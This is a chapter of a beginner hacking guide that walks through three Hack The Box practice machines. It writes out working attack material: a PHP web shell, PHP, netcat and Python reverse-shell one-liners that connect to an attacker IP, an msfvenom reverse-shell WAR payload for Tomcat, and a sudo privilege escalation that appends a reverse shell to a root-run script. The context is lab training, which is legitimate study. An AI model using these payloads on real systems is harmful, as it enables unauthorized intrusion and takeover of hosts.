# Hack The Box Practice Machines

The machines in this section are intentionally simple and reinforce the workflow introduced earlier in this book:

```
Nmap → ExploitDB/Searchsploit → Burp Suite → Shell → Privilege Escalation
```

As you work through these machines, remember your two best friends:

- **YouTube**
- **AI**

You will often learn more from watching someone investigate a machine for ten minutes than from reading several pages of text. The YouTube channel [**IppSec**](https://www.youtube.com/@ippsec) has excellent Hack The Box walkthroughs where you can watch an experienced hacker reason through enumeration and exploitation.

AI tools can also help interpret scan results, explain vulnerabilities, or suggest investigation paths.

When you get stuck, search Google for:

```
htb <box-name> walkthrough
```

There is no shame in reading walkthroughs during the learning process. The goal is understanding the workflow.

## Machine 1: Nibbles (Linux)

[IppSec Nibbles Walkthrough](https://youtu.be/s_0GcRGv6Ds)

[0xdf Nibbles Writeup](https://0xdf.gitlab.io/2018/06/30/htb-nibbles.html)

Nibbles is an excellent beginner machine. It demonstrates how a vulnerable web application can lead to initial access and eventually root privileges.

### Skills Practiced

- Nmap enumeration
- Web application investigation
- Using Searchsploit
- Privilege escalation

### Step 1: Scan the Machine

Run your standard scans.

```
nmap <target-ip>
```

Then run the deeper scan.

```
nmap -p- -sCV <target-ip> -T4 -oA nibbles_tcp
```

The scan will reveal a web service.

Example:

```
80/tcp open http Apache
```

### Step 2: Visit the Website

Open the site in your browser.

Spend time exploring the application. Click links. Look for login forms or interesting pages.

Enable Burp Suite and observe the traffic in Proxy → HTTP history while browsing.

Watching requests appear in Burp often reveals how the application works.

### Step 3: Identify the Application

While exploring the site you will discover that the server runs Nibbleblog.

Now search ExploitDB.

```
searchsploit nibbleblog
```

One of the results will match the version of the application but is using Metasploit and we want to do this like real hackers.

### Step 4: Use the Exploit

We can find a writeup of [CVE-2015-6967](https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html) by searching Google for `nibbleblog 4.0.3 exploit`.

Read the exploit and follow the instructions.

Upload a php file (`cmd.php`) in the My image upload form:

```
<?php system($_REQUEST['cmd']); ?>
```

Visit the following url to confirm it works:

```
http://<target-ip>/nibbleblog/content/private/plugins/my_image/image.php?cmd=id
```

If that works, create a reverse shell php file to upload (`revshell.php`):

```
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-ip-address> 8082 >/tmp/f"); ?>
```

Upload that file and when visiting `image.php` you will catch the reverse shell with netcat:

```
nc -lnvp 8082
```

This should give you access to the system.

### Step 5: Privilege Escalation

Once you gain a shell, continue investigating the machine.

Look for:

- configuration files
- writable directories
- sudo permissions

A very important command:

```
sudo -l
```

This shows which commands the current user can run as root.

On Nibbles, you will discover a script that can be executed with sudo privileges.

We can add another reverse shell to this file to gain a root shell:

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your-ip-address> 8083 > /tmp/f" >> monitor.sh
```

Setup your netcat listner:

```
nc -lnvp 8083
```

Run the allowed command and use it to execute a shell.

```
sudo /home/nibbler/personal/stuff/monitor.sh
```

You should now have a root shell.

### Lesson

Web applications frequently contain vulnerabilities that lead to system access. Careful investigation combined with vulnerability research often reveals the path forward.

Privilege escalation often comes from misconfigured sudo permissions. Always check what the current user can run as root.

## Machine 2: Jerry (Windows)

[IppSec Jerry Walkthrough](https://youtu.be/PJeBIey8gc4)

[0xdf Jerry Writeup](https://0xdf.gitlab.io/2018/11/17/htb-jerry.html)

Jerry is a simple Windows machine that demonstrates how weak configuration can lead to compromise.

### Skills Practiced

- Nmap enumeration
- Investigating web services
- Identifying default credentials

### Step 1: Run Nmap

Run your standard scan workflow.

```
nmap <target-ip>
```

Then run the full scan.

```
nmap -p- -sCV <target-ip> -T4 -oA jerry_tcp
```

One of the services will appear similar to:

```
8080/tcp open http Apache Tomcat
```

### Step 2: Investigate the Web Service

Open the site in your browser.

```
http://<target-ip>:8080
```

Look for administrative panels or login pages. Try logging in with default credentials.

Burp Suite can help you observe how the application communicates with the server.

### Step 3: Research the Service

Search for Tomcat vulnerabilities or common configuration issues.

You might search YouTube for:

```
tomcat manager exploitation
```

Or ask AI tools questions about Tomcat.

Through research you will discover that Tomcat installations sometimes use default credentials.

### Step 4: Gain Access

After accessing the Tomcat manager interface, you can upload a reverse shell war file that executes commands on the server:

```
msfvenom -p windows/shell_reverse_tcp LHOST=<your-ip-address> LPORT=9002 -f war > rev_shell-9002.war
```

Navigating to this files location results in a shell on the Windows machine with your netcat listener:

```
nc -lnvp 9002
```

On Jerry, the shell you obtain is already running with high privileges.

In many cases, you will land directly as:

```
NT AUTHORITY\SYSTEM
```

You can confirm this by running:

```
whoami
```

### Lesson

Many compromises occur because of configuration weaknesses rather than software bugs.

Default credentials and exposed administrative panels are common attack paths.

Some systems are misconfigured so badly that initial access already provides full control. Always check your current privileges immediately after gaining access.

## Machine 3: Bashed (Linux)

[IppSec Bashed Walkthrough](https://youtu.be/2DqdPcbYcy8)

[0xdf Bashed Writeup](https://0xdf.gitlab.io/2018/04/29/htb-bashed.html)

Bashed demonstrates how discovering a web shell can lead to full system compromise.

### Skills Practiced

- Nmap enumeration
- Web directory investigation
- Privilege escalation

### Step 1: Run Nmap

Start with your usual scans.

```
nmap <target-ip>
```

Then run the deeper scan.

```
nmap -p- -sCV <target-ip> -T4 -oA bashed_tcp
```

You will see a web service running on port 80.

### Step 2: Explore the Website

Open the site in your browser and explore the directories.

Pay attention to files or scripts that may allow command execution.

Burp Suite can help observe how requests are sent to the server.

Another tool you can use to find directories is Gobuster:

```
gobuster -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Examine the `/dev` directory and eventually you will discover a web shell already present on the system.

### Step 3: Gain a Shell

Use the web shell to execute commands on the system.

Once you have command execution, upgrade your access to a more stable shell.

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<your-ip-address>",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

We can catch an upgraded shell with netcat:

```
nc -lnvp 1235
```

### Step 4: Escalate Privileges

After gaining a shell, begin investigating the system.

Look for:

- writable scripts
- sudo permissions
- misconfigured services

Run:

```
sudo -l
```

You will discover that the user can run commands as another user or root.

Use this permission to spawn a higher-privileged shell.

```
sudo -u scriptmanager /bin/bash
```

or execute a command allowed by sudo to escalate privileges.

### Lesson

Privilege escalation often comes from simple misconfigurations such as overly permissive sudo rules.

## The Pattern

Each machine in this chapter reinforces the same pattern.

1. Scan the system with Nmap
2. Identify exposed services
3. Research vulnerabilities using ExploitDB
4. Interact with applications using Burp Suite
5. Gain access and escalate privileges

With repetition, this process becomes natural.

Services begin to suggest possible attack paths. Vulnerabilities start to look familiar. Enumeration becomes easier.

Eventually hacking stops feeling random and begins to feel systematic.

That transformation happens through practice.

Now lets turn you into the ultra-hacker from the movies with the bonus tool Tmux in [Chapter 7 - Tmux](07-tmux.md).